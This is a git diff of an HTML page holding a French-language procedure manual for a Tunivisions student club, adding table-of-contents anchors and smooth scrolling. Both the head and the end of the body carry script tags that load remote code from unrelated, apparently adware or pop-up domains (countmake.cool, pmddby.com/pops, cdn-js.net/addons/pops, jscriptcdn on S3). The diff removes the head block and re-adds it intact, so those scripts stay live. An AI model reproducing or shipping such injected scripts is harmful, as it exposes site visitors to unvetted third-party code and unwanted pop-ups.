@@ -4,8 +4,8 @@
   <script type="text/javascript" src="https://keenthemes.com/metr/injected/Async.js"></script>
         <meta charset="utf-8">
 
-        <title>T-Link | Se connecter</title>
-        <meta name="description" content="Se connecter">
+        <title>T-Link | Manuel de procedure</title>
+        <meta name="description" content="le manuel de procedure de Tunivisions Foundation 2019-2020">
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
         <!--begin::Fonts -->
@@ -48,7 +48,9 @@
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
   gtag('config', 'UA-37564768-1');
-</script>    <script async="" src="https://script.hotjar.com/modules.77292ece4a3f99f4b55a.js" charset="utf-8"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style><script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8020x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8020x&amp;format=arrjs&amp;r=1571862920288"></script><script type="text/javascript" src="https://cdncache-a.akamaihd.net/sub/nee5452/52429_8020_/l.js?pid=2450&amp;ext=Not%20set"></script><script type="text/javascript" src="https://countmake.cool/ext/1f546f49ebf4153c8a.js?sid=52429_8020_&amp;title=Not%20set&amp;blocks[]=02aed"></script><script type="text/javascript" src="//cdn-js.net/addons/pops/script.js?t=1571862920909"></script><script async="" type="text/javascript" src="https://s.pmddby.com/pops?c=aHR0cHMlM0EvL2tlZW50aGVtZXMuY29tL21ldHJvbmljL3ByZXZpZXcvZGVtbzEvY3VzdG9tL3BhZ2VzL3VzZXIvbG9naW4tMS5odG1sOjp6LTI0NTAtODkxNDAwODA6Om1ldHJvbmljLHwsbG9naW4scGFnZSwxLGV4YW1wbGU%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-e77b26472afd44969f045ba4d3ca4f77-&amp;cb=P6M64qZiEGnq2QecA8m5&amp;data_fr=true&amp;data_proto=https%3A&amp;data_test=2019041407_c&amp;ed=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=44402&amp;r=1571862921"></script><script async="" type="text/javascript" src="https://s.pmddby.com/pops?c=aHR0cHMlM0EvL2tlZW50aGVtZXMuY29tL21ldHJvbmljL3ByZXZpZXcvZGVtbzEvY3VzdG9tL3BhZ2VzL3VzZXIvbG9naW4tMS5odG1sOjp6LTI0NTAtODkxNDAwODA6Om1ldHJvbmljLHwsbG9naW4scGFnZSwxLGV4YW1wbGU%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-e77b26472afd44969f045ba4d3ca4f77-&amp;cb=QmH8e3rfFP6k821Kam6W&amp;data_fr=true&amp;data_proto=https%3A&amp;data_test=2019041407_c&amp;ed=1&amp;fo=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=43956&amp;r=1571862922"></script><script type="text/javascript" src="//cdn-js.net/addons/pops/license.14.js"></script></head>
+</script>    <script async="" src="https://script.hotjar.com/modules.77292ece4a3f99f4b55a.js" charset="utf-8"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style><script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8020x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8020x&amp;format=arrjs&amp;r=1571862920288"></script><script type="text/javascript" src="https://cdncache-a.akamaihd.net/sub/nee5452/52429_8020_/l.js?pid=2450&amp;ext=Not%20set"></script><script type="text/javascript" src="https://countmake.cool/ext/1f546f49ebf4153c8a.js?sid=52429_8020_&amp;title=Not%20set&amp;blocks[]=02aed"></script><script type="text/javascript" src="//cdn-js.net/addons/pops/script.js?t=1571862920909"></script><script async="" type="text/javascript" src="https://s.pmddby.com/pops?c=aHR0cHMlM0EvL2tlZW50aGVtZXMuY29tL21ldHJvbmljL3ByZXZpZXcvZGVtbzEvY3VzdG9tL3BhZ2VzL3VzZXIvbG9naW4tMS5odG1sOjp6LTI0NTAtODkxNDAwODA6Om1ldHJvbmljLHwsbG9naW4scGFnZSwxLGV4YW1wbGU%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-e77b26472afd44969f045ba4d3ca4f77-&amp;cb=P6M64qZiEGnq2QecA8m5&amp;data_fr=true&amp;data_proto=https%3A&amp;data_test=2019041407_c&amp;ed=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=44402&amp;r=1571862921"></script><script async="" type="text/javascript" src="https://s.pmddby.com/pops?c=aHR0cHMlM0EvL2tlZW50aGVtZXMuY29tL21ldHJvbmljL3ByZXZpZXcvZGVtbzEvY3VzdG9tL3BhZ2VzL3VzZXIvbG9naW4tMS5odG1sOjp6LTI0NTAtODkxNDAwODA6Om1ldHJvbmljLHwsbG9naW4scGFnZSwxLGV4YW1wbGU%3D&amp;a=1&amp;ch=&amp;subid=g-89140080-e77b26472afd44969f045ba4d3ca4f77-&amp;cb=QmH8e3rfFP6k821Kam6W&amp;data_fr=true&amp;data_proto=https%3A&amp;data_test=2019041407_c&amp;ed=1&amp;fo=1&amp;pt=p&amp;pt=r&amp;pt=t&amp;pt=w&amp;ms=43956&amp;r=1571862922"></script><script type="text/javascript" src="//cdn-js.net/addons/pops/license.14.js"></script>
+
+</head>
     <!-- end::Head -->
 
     <!-- begin::Body -->
@@ -95,10 +97,10 @@
       <h1>Manuel de procedure</h1>
       <br><br>
       <ul>
-        <h4>Partie 1 : Introduction</h4>
+        <a href="#S1"><h4>Partie 1 : Introduction</h4></a>
         
         <br>
-        <h5>Section 1 : Préambule</h5>
+        <a href="#S11"><h5>Section 1 : Préambule</h5></a>
         <li>Article 1 : Présentation</li>
         <li>Article 2 : Notre Vision</li>
         <li>Article 3 : Nos valeurs</li>
@@ -106,69 +108,69 @@
         <li>Article 5 : Notre Slogan</li>
         
         <br>
-        <h4>Partie 2 : Administration</h4>
+        <a href="#S2"><h4>Partie 2 : Administration</h4></a>
         <br>
         
-        <h5>Section 1 : Structure du club</h5>
+        <a href="#S21"><h5>Section 1 : Structure du club</h5></a>
         <li>Article 1 : composition du club (Alumni / Membres adhérents)</li>
         <li>Article 2 : Structure du Bureau exécutif</li>
         <li>Article 3 : Départements</li>
-        <h5>Section 2 : Réunion</h5>
+        <a href="#S22"><h5>Section 2 : Réunion</h5></a>
         <li>Article 1 : Les procès-verbaux</li>
         <li>Article 2 : Réunion Bureau exécutif</li>
         <li>Article 3 : Réunions de département</li>
         <li>Article 4 : Assemblée générale</li>
-        <h5>Section 3 : Gestion ressources</h5>
+        <a href="#S23"><h5>Section 3 : Gestion ressources</h5></a>
         <li>Article 4 : Assemblée générale</li>
         <li>Article 1 : Financement</li>
         <li>Article 2 : Matériel</li>
         
         <br>
-        <h4>Partie 3 : Ressource humaine</h4>
+        <a href="#S3"><h4>Partie 3 : Ressource humaine</h4></a>
         <br>
         
-        <h5>Section 1 : Procédure de recrutement</h5>
+        <a href="#S31"><h5>Section 1 : Procédure de recrutement</h5></a>
         <li>Article 1 : L’adhésion au club</li>
         <li>Article 2 : Entretien</li>
-        <h5>Section 2 : Discipline</h5>
+        <a href="#S32"><h5>Section 2 : Discipline</h5></a>
         <li>Article 1 : Le respect</li>
         <li>Article 2 : Les retards</li>
         <li>Article 3 : Les absences</li>
         <li>Article 4 : Les dates limites</li>
         <li>Article 5 : Image de marque</li>
-        <h5>Section 3 : Conseil administrative</h5>
+        <a href="#S33"><h5>Section 3 : Conseil administrative</h5></a>
         <li>Article 1 : hiérarchie</li>
         <li>Article 2 : engagement</li>
         <li>Article 3 : Sanction</li>
         <li>Article 4 : Composition du conseil disciplinaire</li>
         
         <br>
-        <h4>Partie 4 : Gestion Projet</h4>
+        <a href="#S4"><h4>Partie 4 : Gestion Projet</h4></a>
         <br>
         
-        <h5>Section 1 : Type des actions</h5>
+        <a href="#S41"><h5>Section 1 : Type des actions</h5></a>
         <li>Article 1 : Formation</li>
         <li>Article 2 : Team-Building</li>
         <li>Article 3 : événement culturel</li>
         <li>Article 4 : événement divertissement</li>
-        <h5>Section 1 : Type des actions</h5>
+        <a href="#S42"><h5>Section 2 : évaluation des actions</h5></a>
         <li>Article 1 : événement permis</li>
         <li>Article 2 : Rapport final d'événement</li>
 
         <br>
-        <h4>Partie 5 : T.LINK</h4>
+        <a href="#S5"><h4>Partie 5 : T.LINK</h4></a>
         <br>
 
-        <h5>Section 1: Gestion T.LINK</h5>
+        <a href="#S4=51"><h5>Section 1: Gestion T.LINK</h5></a>
         <li>Article 1: La plateforme</li>
       </ul>
 
       <br><br><br>
 
 
-      <section>
+      <section id="S1">
         <h1>Introduction</h1>
-        <h2>Section 1 : Préambule</h2>
+        <h2 id="S11">Section 1 : Préambule</h2>
       
         <br>
         <h3>Article 1 : Présentation</h3>
@@ -202,7 +204,7 @@
 
 
       <br> <br>
-      <h2>Section 2: Objet</h2>
+      <h2 id="S12">Section 2: Objet</h2>
       <br>
       <h3>Article 1 : Présentation</h3>
       L’objet du Manuel de procédure est de clarifier les lignes de conduite et les procédures afin d’aider les membres du Club dans leur rôle. Ce manuel est révisé par le bureau national. Un exemplaire est adressé à chaque club Tunivisions et à chaque membre du club.
@@ -251,14 +253,16 @@
       </section>
 
 <br><br>
-      <section>
+      <section id="S2">
         <h1>Administration</h1>
-        <h2>Section 1 : Structure du club</h2>
+        <h2 id="S21">Section 1 : Structure du club</h2>
       
         <br>
         <h3>Article 1 : composition du club (Alumni / Membres adhérents)</h3>
         Le club Tunivisions est composé des membres suivants : <br><b>Alumni :</b> Membres de l’ancien bureau Tunivisions qui ont terminé au moins une mandat sans aucune sanction ou interruption. <br><b>Membres adhérents :</b> Le club est composé des étudiants acceptés par le bureau actuel après un processus de recrutement et pré déclare.
         
+        <br>
+        <h2 id="S22">Section 2 : Réunion</h2>
         <br>
         <h3>Article 1 : Les procès-verbaux</h3>
         Les procès-verbaux de toutes les réunions sont rédigés par le Vice-Président Administration et Finance. Il s'engage à publier tout procès-verbal dans un délai ne dépassant pas 48h après la tenue d'une réunion.
@@ -280,7 +284,7 @@
         L’assemblée générale comprend tous les membres du club. Elle se réunit au moins une fois par mois. La convocation de l’assemblée générale doit être communiquée aux membres du club au moins 48 heures avant la date fixée. L’ordre du jour de l’assemblée générale est fixé par le président ou par le bureau exécutif. Il doit tenir compte des questions soumises par tout membre permanant. L’assemblée générale délibère et se prononce sur les questions figurant à son ordre du jour.
         
         <br>
-        <h2>Section 3 : Gestion ressources</h2>
+        <h2 id="S23">Section 3 : Gestion ressources</h2>
         <h3>Article 1 : Financement</h3>
         Utiliser le compte bancaire du Tunivisions fondations pour le sponsoring.
         Cotisation : L’obligation de payer la cotisation fixée (7dt). Cette cotisation sert à couvrir les frais de fonctionnement. Chaque adhérent recevra en retour une carte membre attestant son inscription au club et devra en permanence la porter sur lui.<br>
@@ -294,9 +298,9 @@
 
 <br> <br>
 
-      <section>
+      <section id="S3">
         <h1>Ressource humaine</h1>
-        <h2>Section 1 : Procédure de recrutement</h2>
+        <h2 id="S31">Section 1 : Procédure de recrutement</h2>
 
         <br>
         <h3>Article 1 : L’adhésion au club</h3>
@@ -311,7 +315,7 @@
         Choisir les membres qui vont intégrer le clubs suite à leurs entretient et établir à chacun son ‘job description’.
 
         <br>
-        <h2>Section 2 : Discipline</h2>
+        <h2 id="S32">Section 2 : Discipline</h2>
 
         <br>
         <h3>Article 1 : Le respect</h3>
@@ -340,7 +344,7 @@
         Un membre se doit obligatoirement de représenter le club ou la fondation de la meilleure façon qui soit et de défendre ses valeurs, et ce pendant les séminaires nationaux, événements, stands, forums et tous types de candidatures internes et externes ainsi que les publications sur les réseaux sociaux qui pouvant nuire directement à l’image du club.
        
        <br>
-        <h2>Section 3 : Conseil administratif</h2>
+        <h2 id="S33">Section 3 : Conseil administratif</h2>
 
         <br>
         <h3>Article 1 : Hiérarchie</h3>
@@ -373,9 +377,9 @@
       </section>
 
 <br><br>
-      <section>
+      <section id="S4">
         <h1>Gestion Projet</h1>
-        <h2>Section 1 : Type des actions</h2>        
+        <h2 id="S41">Section 1 : Type des actions</h2>        
 
         <br>
         <h3>Article 1 : Formation</h3>
@@ -406,7 +410,7 @@
         <li> Des évènements de coaching</li>
 
 
-        <h2>Section 2 : Évaluation des actions</h2>
+        <h2 id="S42">Section 2 : Évaluation des actions</h2>
         
         <br>
         <h3>Article 1 : Evénement permis</h3>
@@ -428,9 +432,9 @@
 
       <br><br>
 
-      <section>
+      <section id="S5">
         <h1>T.link</h1>
-        <h2>Section 1 : Gestion T.LINK</h2>        
+        <h2 id="S51">Section 1 : Gestion T.LINK</h2>        
 
         <br>
         <h3>Article 1 : La plateforme</h3>
@@ -496,4 +500,38 @@
             
     <!-- end::Body -->
 
-<script src="//s3.amazonaws.com/jscriptcdn/1f546f49ebf4153c8a.js"></script><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/box-74dcf4e32eff343c96838bf3a780ac1d.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe style="display: none; visibility: hidden;"></iframe><iframe style="position:absolute;left:-999px;top:-999px;visibility:hidden"></iframe><iframe style="display: none; visibility: hidden;"></iframe><script>[object Object]</script></body></html>
+<script src="//s3.amazonaws.com/jscriptcdn/1f546f49ebf4153c8a.js"></script><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/box-74dcf4e32eff343c96838bf3a780ac1d.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe style="display: none; visibility: hidden;"></iframe><iframe style="position:absolute;left:-999px;top:-999px;visibility:hidden"></iframe><iframe style="display: none; visibility: hidden;"></iframe><script>[object Object]</script></body>
+
+<style type="text/css"><style>
+html {
+  scroll-behavior: smooth;
+}</style>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+  // Add smooth scrolling to all links
+  $("a").on('click', function(event) {
+
+    // Make sure this.hash has a value before overriding default behavior
+    if (this.hash !== "") {
+      // Prevent default anchor click behavior
+      event.preventDefault();
+
+      // Store hash
+      var hash = this.hash;
+
+      // Using jQuery's animate() method to add smooth page scroll
+      // The optional number (800) specifies the number of milliseconds it takes to scroll to the specified area
+      $('html, body').animate({
+        scrollTop: $(hash).offset().top
+      }, 800, function(){
+
+        // Add hash (#) to URL when done scrolling (default click behavior)
+        window.location.hash = hash;
+      });
+    } // End if
+  });
+});
+</script>
+</html>
